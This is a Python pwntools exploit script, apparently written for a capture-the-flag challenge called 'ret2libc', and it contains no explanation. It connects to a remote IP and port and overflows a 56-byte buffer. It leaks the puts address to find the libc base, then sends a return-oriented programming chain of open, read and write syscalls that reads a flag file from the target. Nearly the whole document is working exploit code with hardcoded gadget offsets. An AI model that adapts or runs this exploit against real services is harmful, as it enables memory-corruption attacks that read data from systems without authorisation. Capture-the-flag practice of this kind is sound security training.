# bc bc bc bc bc bc bc bc bc bc bc bc bc bc bc bc bc bc bc bc bc bc bc bc bc bc bc bc 
# bc bc bc bc bc bc bc bc bc bc bc bc bc bc bc bc bc bc bc bc bc bc bc bc bc bc bc bc 
# |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||| ROPgadget --binary libc.so.6 --multibr ||||||||||||||||||||||
# |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# bc bc bc bc bc bc bc bc bc bc bc bc bc bc bc bc bc bc bc bc bc bc bc bc bc bc bc bc 
# bc bc bc bc bc bc bc bc bc bc bc bc bc bc bc bc bc bc bc bc bc bc bc bc bc bc bc bc 

from pwn import * 

# p = process("./ret2libc",env={"LD_PRELOAD":"./libc.so.6"})
p = remote('34.213.62.140',6504)
elf= context.binary = ELF("./ret2libc")
libc = ELF("./libc.so.6")
#buffer oveflow
# gdb.attach(p, "init-gef")
offset = 56 #to rip register
pop_rdi_ret = 0x0000000000401373
ret = 0x000000000040101a

for i in range(5):
    p.recvline()
print(libc.address)
print(hex(libc.sym.puts))
payload = b'a'*offset + p64(pop_rdi_ret)+ p64(elf.got.puts)+p64(elf.plt.puts) + p64(elf.sym.waifusSecret)
p.sendline(payload)
k = p.recvline()[:-1]
k = k.ljust(8,b'\x00')
print(k)
k = u64(k)
libc.address = k - libc.symbols.puts
# libc.address = k - 0x84450
# print(hex(libc.address))
# pprint(elf.symbols)
# rop = ROP(libc)
# pprint(elf.sym)

# rop.open(0x402020,)
# rop.read(0x3,0x404090,0x50)
# rop.write(1,0x404090,0x50)

flag_location = 0x402020


# rop.call('open',[0x402020])
# rop.call('read',[0x402020,0x404090,0x100])
# rop.call('write',[1,0x404090,0x100])

# pprint(rop.chain())

# print(rop.dump())
# payload = 


pop_rdi_ret = libc.address + 0x0000000000023b6a
pop_rsi_ret = libc.address + 0x000000000002601f
pop_rdx_ret = libc.address + 0x0000000000142c92
pop_rax_ret = libc.address + 0x0000000000036174
# syscall = libc.address + 0x000000000002284d
syscall = libc.address + 0x00000000000630a9

payload = flat(
    b'a'*offset,
    ret,
    pop_rax_ret,
    0x2,
    pop_rdi_ret,
    0x402020,
    pop_rsi_ret,
    0x0,
    pop_rdx_ret,
    0x3,
    syscall,
    pop_rax_ret,
    0x0,
    pop_rdi_ret,
    0x3,
    pop_rsi_ret,
    0x404090,
    pop_rdx_ret,
    0x50,
    syscall,
    pop_rax_ret,
    0x1,
    pop_rdi_ret,
    0x1,
    pop_rsi_ret,
    0x404090,
    pop_rdx_ret,
    0x50,
    syscall,
    ret,
    p64(elf.sym.waifusSecret)
)




# gdb.attach(p,'init-gef')
for i in range(5):
    p.recvline()
p.sendline(payload)


p.interactive()
